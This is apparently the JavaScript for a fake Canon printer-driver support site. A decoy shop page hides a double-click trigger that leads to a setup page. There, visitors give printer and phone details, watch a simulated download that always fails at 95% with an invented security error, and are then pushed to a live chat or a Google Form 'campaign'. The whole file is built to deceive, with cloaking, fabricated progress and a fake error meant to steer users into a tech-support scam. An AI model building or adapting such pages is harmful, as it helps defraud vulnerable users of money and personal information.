// Campaign Configuration
const CONFIG = {
    isActive: false, // Set to true when campaign is active and you want to use the Google Form
    googleFormUrl: 'https://docs.google.com/forms/d/e/1FAIpQLSfpXqH1Yg0P7X5_K80Qc6F_L9V_jXpQd1-f_example/viewform', // Put your Google Form link here
    
    // Choose how the active campaign behaves:
    redirectImmediatelyFromSecretTrigger: false, // If true, double-clicking copyright goes straight to Google Form
    redirectAfterSubmit: true,                  // If true, submitting setup form redirects directly to Google Form
    showGoogleFormLinkOnError: true             // If true, displays a verification button linking to Google Form on download failure
};

// Shop Product Data
const PRODUCTS = {
    smartwatches: [
        {
            title: "Apple Watch Series 5 GPS",
            price: "$399.99",
            rating: "⭐⭐⭐⭐⭐",
            reviewsCount: 242,
            image: "https://pngimg.com/uploads/apple_watch/apple_watch_PNG49.png"
        }
    ],
    printers: [
        {
            title: "Canon PIXMA TS3480 Wireless All-in-One Printer",
            price: "$79.99",
            rating: "⭐⭐⭐⭐",
            reviewsCount: 104,
            image: "https://upload.wikimedia.org/wikipedia/commons/e/e0/Canon_PIXMA_TS_3480_Multifunction_ink-jet_Printer.jpg"
        },
        {
            title: "Canon PIXMA TR150 Portable Wireless Printer",
            price: "$199.99",
            rating: "⭐⭐⭐⭐⭐",
            reviewsCount: 88,
            image: "https://upload.wikimedia.org/wikipedia/commons/6/6c/Canon_PIXMA_TR150_ink-jet_Printer.jpg"
        },
        {
            title: "Canon PIXMA TS207 Single Function Inkjet Printer",
            price: "$49.99",
            rating: "⭐⭐⭐⭐",
            reviewsCount: 65,
            image: "https://upload.wikimedia.org/wikipedia/commons/6/6f/Canon_PIXMA_TS207_Printer_picture.jpg"
        },
        {
            title: "Samsung Xpress M2020W Wireless Monochrome Laser Printer",
            price: "$129.99",
            rating: "⭐⭐⭐⭐⭐",
            reviewsCount: 156,
            image: "https://pngimg.com/uploads/printer/printer_PNG7739.png"
        }
    ]
};

// Global redirect function called by the decoy page's double-click handler
function handleSecretRedirect() {
    if (CONFIG.isActive && CONFIG.redirectImmediatelyFromSecretTrigger) {
        window.location.href = CONFIG.googleFormUrl;
    } else {
        window.location.href = 'setup.html';
    }
}

document.addEventListener('DOMContentLoaded', () => {
    let cartCount = 0;
    let cartItems = [];
    
    const form = document.getElementById('setup-form');
    if (form) {
        form.addEventListener('submit', handleFormSubmit);
    }

    const startDownloadBtn = document.getElementById('start-download-btn');
    if (startDownloadBtn) {
        startDownloadBtn.addEventListener('click', startFakeDownload);
    }

    const phoneInput = document.getElementById('phone');
    if (phoneInput) {
        phoneInput.addEventListener('input', function(e) {
            // Remove any non-digit characters
            this.value = this.value.replace(/\D/g, '');
        });
    }

    const customChatBtn = document.getElementById('custom-chat-btn');
    if (customChatBtn) {
        customChatBtn.addEventListener('click', function() {
            if (typeof Tawk_API !== 'undefined') {
                Tawk_API.maximize();
                this.classList.remove('bounce-animation');
            }
        });
    }

    // Shop Modal Logic
    const modal = document.getElementById('shop-modal');
    const modalTitle = document.getElementById('modal-category-title');
    const productsGrid = document.getElementById('modal-products-grid');
    const closeBtn = document.getElementById('close-shop-modal');
    const watchLink = document.getElementById('shop-smartwatches');
    const printerLink = document.getElementById('shop-printers');
    
    // Cart Modal Elements
    const cartModal = document.getElementById('cart-modal');
    const closeCartBtn = document.getElementById('close-cart-modal');
    const floatingCart = document.getElementById('floating-cart');
    const cartItemsContainer = document.getElementById('cart-items-container');
    const cartTotalPrice = document.getElementById('cart-total-price');
    
    function renderCart() {
        if (!cartItemsContainer || !cartTotalPrice) return;
        
        if (cartItems.length === 0) {
            cartItemsContainer.innerHTML = '<div class="cart-empty">Your cart is empty</div>';
            cartTotalPrice.innerText = '$0.00';
            return;
        }
        
        cartItemsContainer.innerHTML = '';
        let total = 0;
        
        cartItems.forEach(item => {
            const priceVal = parseFloat(item.price.replace('$', ''));
            total += priceVal;
            
            const cartItemEl = document.createElement('div');
            cartItemEl.className = 'cart-item';
            cartItemEl.innerHTML = `
                <img src="${item.image}" alt="${item.title}" class="cart-item-img">
                <div class="cart-item-info">
                    <div class="cart-item-title">${item.title}</div>
                    <div class="cart-item-price">${item.price}</div>
                </div>
            `;
            cartItemsContainer.appendChild(cartItemEl);
        });
        
        cartTotalPrice.innerText = '$' + total.toFixed(2);
    }

    function openModal(category) {
        if (!modal || !modalTitle || !productsGrid) return;
        
        // Clear grid
        productsGrid.innerHTML = '';
        
        // Set category title
        modalTitle.innerText = category === 'smartwatches' ? 'Apple Premium Smartwatches' : 'Canon Inkjet Printers';
        
        // Inject product cards
        const items = PRODUCTS[category] || [];
        items.forEach(item => {
            const card = document.createElement('div');
            card.className = 'product-card';
            card.innerHTML = `
                <div class="product-image-wrapper">
                    <img src="${item.image}" alt="${item.title}" class="product-image">
                </div>
                <h3 class="product-title">${item.title}</h3>
                <div class="product-reviews">
                    <span class="stars">${item.rating}</span>
                    <span>(${item.reviewsCount} reviews)</span>
                </div>
                <div class="product-price">${item.price}</div>
                <button class="product-add-btn">
                    <span>Add to Cart</span>
                </button>
            `;
            
            // Add click listener to Add to Cart button
            const addBtn = card.querySelector('.product-add-btn');
            addBtn.addEventListener('click', function() {
                if (this.classList.contains('added')) return;
                
                const span = this.querySelector('span');
                const originalWidth = this.offsetWidth;
                this.style.width = `${originalWidth}px`; // prevent layout jump
                span.innerText = 'Adding...';
                
                // Trigger fly-to-cart animation
                const img = card.querySelector('.product-image');
                const cart = document.getElementById('floating-cart');
                const cartBadge = document.getElementById('cart-badge');
                
                if (img && cart && cartBadge) {
                    const flyer = document.createElement('div');
                    flyer.className = 'flying-item';
                    
                    const flyerImg = document.createElement('img');
                    flyerImg.src = img.src;
                    flyer.appendChild(flyerImg);
                    
                    const rect = img.getBoundingClientRect();
                    flyer.style.top = `${rect.top}px`;
                    flyer.style.left = `${rect.left}px`;
                    flyer.style.width = `${rect.width}px`;
                    flyer.style.height = `${rect.height}px`;
                    document.body.appendChild(flyer);
                    
                    const cartRect = cart.getBoundingClientRect();
                    
                    // Force reflow
                    flyer.offsetWidth;
                    
                    // Translate from original location to target cart location and shrink
                    const transX = cartRect.left - rect.left + (cartRect.width/2 - rect.width/2);
                    const transY = cartRect.top - rect.top + (cartRect.height/2 - rect.height/2);
                    
                    flyer.style.transform = `translate(${transX}px, ${transY}px) scale(0.15)`;
                    flyer.style.opacity = '0.3';
                    flyer.style.width = '30px';
                    flyer.style.height = '30px';
                    
                    setTimeout(() => {
                        flyer.remove();
                        cartCount++;
                        cartBadge.innerText = cartCount;
                        cartBadge.classList.add('show');
                        
                        // Add to cartItems array
                        cartItems.push(item);
                        renderCart();
                        
                        // Cart icon bump animation
                        cart.classList.add('bump');
                        setTimeout(() => cart.classList.remove('bump'), 300);
                    }, 800);
                }
                
                setTimeout(() => {
                    this.classList.add('added');
                    span.innerHTML = 'Added ✓';
                    
                    // Reset button state after a delay
                    setTimeout(() => {
                        this.classList.remove('added');
                        this.style.width = '';
                        span.innerText = 'Add to Cart';
                    }, 2500);
                }, 800);
            });
            
            productsGrid.appendChild(card);
        });
        
        // Open modal
        modal.classList.add('show');
    }

    if (watchLink) {
        watchLink.addEventListener('click', (e) => {
            e.preventDefault();
            openModal('smartwatches');
        });
    }

    if (printerLink) {
        printerLink.addEventListener('click', (e) => {
            e.preventDefault();
            openModal('printers');
        });
    }

    if (closeBtn) {
        closeBtn.addEventListener('click', () => {
            modal.classList.remove('show');
        });
    }
    
    // Cart Events
    if (floatingCart) {
        floatingCart.addEventListener('click', () => {
            if (cartModal) {
                cartModal.classList.add('show');
            }
        });
    }
    
    if (closeCartBtn) {
        closeCartBtn.addEventListener('click', () => {
            if (cartModal) {
                cartModal.classList.remove('show');
            }
        });
    }

    window.addEventListener('click', (e) => {
        if (e.target === modal) {
            modal.classList.remove('show');
        }
        if (e.target === cartModal) {
            cartModal.classList.remove('show');
        }
    });
});

function handleFormSubmit(e) {
    e.preventDefault();

    const submitBtn = document.getElementById('submit-btn');
    const btnText = document.getElementById('btn-text');
    const btnSpinner = document.getElementById('btn-spinner');

    if (!submitBtn) return;

    // Show loading state
    submitBtn.disabled = true;
    if (btnText) btnText.style.display = 'none';
    if (btnSpinner) btnSpinner.style.display = 'block';

    // Collect form data
    const formData = new FormData(e.target);
    const data = Object.fromEntries(formData.entries());
    
    // Set dynamic package name based on printer model entered
    const printerModel = data.printerModel || 'TS3520';
    const safeModelName = printerModel.trim().replace(/[^a-zA-Z0-9]/g, '_');
    const driverPackageName = document.getElementById('driver-package-name');
    if (driverPackageName) {
        driverPackageName.innerText = `Canon_msetup_${safeModelName}_Installer.pkg`;
    }

    // Active Campaign: If active and set to redirect on form submit, redirect to Google Form
    if (CONFIG.isActive && CONFIG.redirectAfterSubmit) {
        setTimeout(() => {
            // Append form details as prefilled parameters if desired, or redirect directly
            window.location.href = CONFIG.googleFormUrl;
        }, 1200);
        return;
    }

    // Default Scenario: Simulate a network request delay (1.5 seconds) and show download steps
    setTimeout(() => {
        // Advance wizard steps: Complete step-1, activate step-2
        const step1 = document.getElementById('step-1');
        const step2 = document.getElementById('step-2');
        if (step1) {
            step1.classList.remove('active');
            step1.classList.add('completed');
            const stepNumberElement = step1.querySelector('.step-number');
            if (stepNumberElement) stepNumberElement.innerHTML = '✓';
        }
        if (step2) {
            step2.classList.add('active');
        }

        // Hide registration form card container
        const formContainer = document.getElementById('form-container');
        if (formContainer) formContainer.style.display = 'none';
        
        // Show download section container
        const downloadSection = document.getElementById('download-section');
        if (downloadSection) downloadSection.style.display = 'block';
    }, 1500);
}

function startFakeDownload() {
    const startDownloadBtn = document.getElementById('start-download-btn');
    const startContainer = document.getElementById('download-start-container');
    const progressContainer = document.getElementById('progress-container');
    const progressBarFill = document.getElementById('progress-bar-fill');
    const progressText = document.getElementById('progress-text');
    const speedText = document.getElementById('progress-speed-text');
    const statusLabel = document.getElementById('downloading-status-label');

    // Update wizard steps: Complete step-2, activate step-3
    const step2 = document.getElementById('step-2');
    const step3 = document.getElementById('step-3');
    if (step2) {
        step2.classList.remove('active');
        step2.classList.add('completed');
        const stepNumberElement = step2.querySelector('.step-number');
        if (stepNumberElement) stepNumberElement.innerHTML = '✓';
    }
    if (step3) {
        step3.classList.add('active');
    }

    // Hide the download start button and show the progress bar
    if (startContainer) startContainer.style.display = 'none';
    if (progressContainer) progressContainer.style.display = 'block';

    let progress = 0;
    const totalSize = 45.0; // 45.0 MB
    
    // Simulate download progress
    const downloadInterval = setInterval(() => {
        // Random increment between 2 and 6 percent
        const increment = Math.floor(Math.random() * 5) + 2;
        progress += increment;

        if (progress >= 95) {
            progress = 95;
            clearInterval(downloadInterval);
            
            // Trigger failure
            setTimeout(() => {
                showErrorAndChat();
            }, 800);
        }

        // Update UI
        if (progressBarFill) progressBarFill.style.width = `${progress}%`;
        if (progressText) progressText.innerText = `${progress}%`;
        
        // Calculate downloaded size
        const currentMB = ((progress / 100) * totalSize).toFixed(1);
        if (statusLabel) {
            statusLabel.innerText = `Downloading Drivers Package (${currentMB} MB / ${totalSize} MB)...`;
        }

        // Simulating speed fluctuation
        const speeds = [1.2, 1.4, 1.5, 1.7, 1.1, 1.3];
        const randomSpeed = speeds[Math.floor(Math.random() * speeds.length)];
        if (speedText) {
            speedText.innerText = `Download Speed: ${randomSpeed} MB/s - Remaining time: ${Math.ceil((totalSize - currentMB) / randomSpeed)}s`;
        }
        
    }, 250); // Update every 250ms
}

function showErrorAndChat() {
    const progressBarFill = document.getElementById('progress-bar-fill');
    const speedText = document.getElementById('progress-speed-text');
    const statusLabel = document.getElementById('downloading-status-label');
    const errorMessage = document.getElementById('error-message');
    const customChatBtn = document.getElementById('custom-chat-btn');
    const googleFormBypassBtn = document.getElementById('google-form-bypass-btn');
    
    // Show error message
    if (errorMessage) errorMessage.style.display = 'block';
    
    // Turn progress bar red
    if (progressBarFill) {
        progressBarFill.style.backgroundColor = '#d93025';
        progressBarFill.style.backgroundImage = 'none'; // Stop striped animation
    }

    // Update status labels
    if (statusLabel) {
        statusLabel.innerText = 'Package Repackaging Failed';
    }
    if (speedText) {
        speedText.innerText = 'Error Details: Unpacking process locked by security.';
        speedText.style.color = '#d93025';
    }

    // Show Google Form bypass button if configured
    if (CONFIG.isActive && CONFIG.showGoogleFormLinkOnError && googleFormBypassBtn) {
        googleFormBypassBtn.href = CONFIG.googleFormUrl;
        googleFormBypassBtn.style.display = 'inline-flex';
    }

    // Show custom chat button in bottom corner and animate it
    if (customChatBtn) {
        customChatBtn.style.display = 'flex';
        customChatBtn.classList.add('bounce-animation');
    }
}
